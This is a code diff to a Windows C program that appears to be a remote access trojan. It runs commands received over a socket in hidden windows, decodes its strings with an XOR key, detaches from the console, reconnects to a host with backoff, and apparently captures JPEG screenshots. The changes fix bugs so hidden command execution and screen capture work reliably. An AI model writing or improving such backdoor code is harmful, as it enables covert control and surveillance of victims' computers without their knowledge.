@@ -150,6 +150,7 @@ static void run_cmd(SOCKET s, const char* cmdline) {
     STARTUPINFOA si;
     PROCESS_INFORMATION pi;
     char cmd[1024];
+    HANDLE hIn;
     sa.nLength = sizeof(sa);
     sa.bInheritHandle = TRUE;
     sa.lpSecurityDescriptor = NULL;
@@ -158,6 +159,10 @@ static void run_cmd(SOCKET s, const char* cmdline) {
         return;
     }
     SetHandleInformation(hOutW, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
+    /* GUI subsystem has no std handles: give the child a real NUL stdin so
+       commands that read stdin do not hang on an invalid handle. */
+    hIn = CreateFileA("NUL", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                      &sa, OPEN_EXISTING, 0, NULL);
     memset(&si, 0, sizeof(si));
     memset(&pi, 0, sizeof(pi));
     si.cb = sizeof(si);
@@ -165,7 +170,7 @@ static void run_cmd(SOCKET s, const char* cmdline) {
     si.wShowWindow = SW_HIDE;
     si.hStdOutput = hOutW;
     si.hStdError = hOutW;
-    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
+    si.hStdInput = hIn != INVALID_HANDLE_VALUE ? hIn : NULL;
     {
         char fmt[24];
         xdec_k(fmt, enc_cmd_c, 0x5A);
@@ -174,10 +179,12 @@ static void run_cmd(SOCKET s, const char* cmdline) {
     if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE,
                         CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
         CloseHandle(hOutR); CloseHandle(hOutW);
+        if (hIn != INVALID_HANDLE_VALUE) CloseHandle(hIn);
         send_err(s, "spawn fail");
         return;
     }
     CloseHandle(hOutW);
+    if (hIn != INVALID_HANDLE_VALUE) CloseHandle(hIn);
     for (;;) {
         BOOL ok = ReadFile(hOutR, buf, sizeof(buf) - 1, &rd, NULL);
         if (!ok || rd == 0) break;
@@ -393,6 +400,9 @@ int main(void) {
     char host[64], port[16];
     int backoff = 5;
     FreeConsole();
+    /* CreateStreamOnHGlobal (jpeg encoder) fails with CO_E_NOTINITIALIZED
+       unless this thread has COM initialized. */
+    OleInitialize(NULL);
     {
         typedef BOOL(WINAPI* SetCtx)(HANDLE);
         HMODULE u = GetModuleHandleA("user32.dll");
